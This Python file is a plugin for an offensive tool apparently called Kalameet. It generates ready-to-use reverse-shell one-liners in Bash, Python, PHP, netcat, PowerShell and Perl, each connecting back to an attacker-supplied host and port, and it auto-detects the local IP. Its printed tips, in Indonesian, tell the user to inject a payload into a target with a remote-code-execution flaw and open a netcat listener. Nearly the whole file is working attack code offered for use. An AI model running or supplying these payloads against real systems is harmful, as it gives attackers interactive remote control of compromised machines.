import socket
from kalameet.core.base import BasePlugin
from kalameet.core.interface import Colors

class ShellGenPlugin(BasePlugin):
    meta = {
        'name': 'generate',
        'description': 'Reverse Shell Payload Generator (Python, PHP, Bash)',
        'author': 'Kalameet'
    }

    def add_arguments(self, parser):
        parser.add_argument("--lhost", help="Local IP Address (Attacker IP)")
        parser.add_argument("--lport", default="4444", help="Local Port (Default: 4444)")

    def get_local_ip(self):
        """Mencoba menebak IP LAN laptop secara otomatis"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80)) # Coba connect ke Google DNS (tidak kirim data)
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"

    def run(self, args):
        # 1. Tentukan IP (Manual atau Otomatis)
        lhost = args.lhost
        if not lhost:
            lhost = self.get_local_ip()
            print(f"{Colors.WARNING}[?] No LHOST provided. Auto-detected IP: {lhost}{Colors.ENDC}")
        
        lport = args.lport

        print(f"\n{Colors.BLUE}[*] Generating Reverse Shell Payloads{Colors.ENDC}")
        print(f"{Colors.BLUE}[*] Connect Back to: {lhost}:{lport}{Colors.ENDC}\n")

        # 2. Daftar Payload
        payloads = {
            "BASH (Classic)": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
            
            "PYTHON3 (Modern)": f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
            
            "PHP (Web Shell)": f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
            
            "NETCAT (OpenBSD)": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",
            
            "NETCAT (Traditional)": f"nc -e /bin/sh {lhost} {lport}",
            
            "POWERSHELL (Windows)": f"$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()",
            
            "PERL": f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}}'"
        }

        # 3. Tampilkan
        print("-" * 60)
        for name, code in payloads.items():
            print(f"{Colors.GREEN}[{name}]{Colors.ENDC}")
            print(f"{code}")
            print("-" * 60)
        
        print(f"\n{Colors.WARNING}[?] TIPS: Copy payload di atas dan injeksikan ke target RCE.{Colors.ENDC}")
        print(f"{Colors.WARNING}[?] Jangan lupa pasang telinga (Listener): nc -lvnp {lport}{Colors.ENDC}")